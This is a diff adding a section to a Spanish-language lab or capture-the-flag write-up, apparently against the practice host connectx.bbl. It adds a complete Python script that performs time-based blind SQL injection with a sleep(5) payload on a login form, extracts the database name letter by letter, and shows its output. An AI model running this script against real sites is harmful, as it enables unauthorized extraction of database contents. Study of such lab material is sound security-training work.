@@ -209,4 +209,101 @@ Este método se usa en ataques de **SQL Injection Time-Based Blind**, cuando no 
 > databaseName.py
 
 ```python
+import requests
+import string
+import time
+from pwn import log
+from termcolor import cprint
+from colorama import init
+
+# Inicializar colorama
+init(autoreset=True)
+
+# Configuración de la URL y encabezados
+URL = "http://connectx.bbl/home.php"
+HEADERS = {
+    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
+    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8",
+    "Accept-Language": "en-US,en;q=0.5",
+    "Accept-Encoding": "gzip, deflate, br",
+    "Origin": "http://connectx.bbl",
+    "Connection": "keep-alive",
+    "Referer": "http://connectx.bbl/home.php",
+    "Upgrade-Insecure-Requests": "1",
+    "Content-Type": "application/x-www-form-urlencoded",
+    "Cookie": "PHPSESSID=<COOKIE>"
+}
+
+# Caracteres a probar (mayúsculas y minúsculas)
+CHARSET = string.ascii_letters  # abc...xyzABC...XYZ
+
+def animar_letras(base, char_actual, longitud):
+    """
+    Función para mostrar la animación de letras probadas en tiempo real.
+    Se actualiza cada vez que se prueba una nueva letra.
+    """
+    animacion = base + char_actual + "_" * (longitud - len(base) - 1)
+    cprint(f"Probando: {animacion}", 'yellow', end='\r')
+    time.sleep(0.05)  # Pequeña pausa para la animación
+
+def inferir_nombre_db():
+    nombre_db = ""
+    index = 1
+    p = log.progress("Descubriendo nombre de la base de datos")
+
+    while True:
+        encontrado = False
+        for char in CHARSET:
+            animar_letras(nombre_db, char, index)  # Se ve cada letra probada en tiempo real
+
+            # Enviamos la solicitud con la letra actual
+            payload = f"username=admin'+or+if(substr(database(),{index},1)='{char}',sleep(5),1)--+-"
+            inicio = time.time()
+            requests.post(URL, headers=HEADERS, data=payload)
+            tiempo_respuesta = time.time() - inicio
+
+            # Si la respuesta tarda >= 5s, hemos encontrado la letra correcta
+            if tiempo_respuesta >= 5:
+                nombre_db += char  # Guardamos la letra correcta
+                p.status(f"{nombre_db}")  # Actualizamos la barra de progreso
+                encontrado = True
+                break  # Salimos del bucle de caracteres, pasamos a la siguiente posición
+
+        if not encontrado:
+            break  # Si no encontramos más letras, terminamos el proceso
+
+        index += 1  # Pasamos a la siguiente letra
+
+    p.success(f"Nombre de la base de datos descubierto: {nombre_db}")
+    mostrar_tabla_resultado(nombre_db)
+    return nombre_db
+
+def mostrar_tabla_resultado(nombre_db):
+    """
+    Muestra una mini tabla con el resultado final.
+    """
+    cprint("\n+--------------------+---------------------------+", 'cyan')
+    cprint(f"| Nombre de la Base   | {nombre_db:<23} |", 'cyan')
+    cprint("+--------------------+---------------------------+", 'cyan')
+
+if __name__ == "__main__":
+    inferir_nombre_db()
 ```
+
+Reemplazamos `<COOKIE>` por la cookie que tengamos nosotros asignados en la pagina web, para que inicie sesion directamente, tendremos que ejecutarlo de la siguiente forma:
+
+```sh
+python3 databaseName.py
+```
+
+Info:
+
+```
+[+] Descubriendo nombre de la base de datos: Nombre de la base de datos descubierto: connectx
+Probando: connectxZ
++--------------------+---------------------------+
+| Nombre de la Base   | connectx                |
++--------------------+---------------------------+
+```
+
+Vemos que nos saca el nombre de la base de datos llamada `connectx`, por lo que ahora tendremos que saber las tablas que tiene dicha base de datos.&#x20;
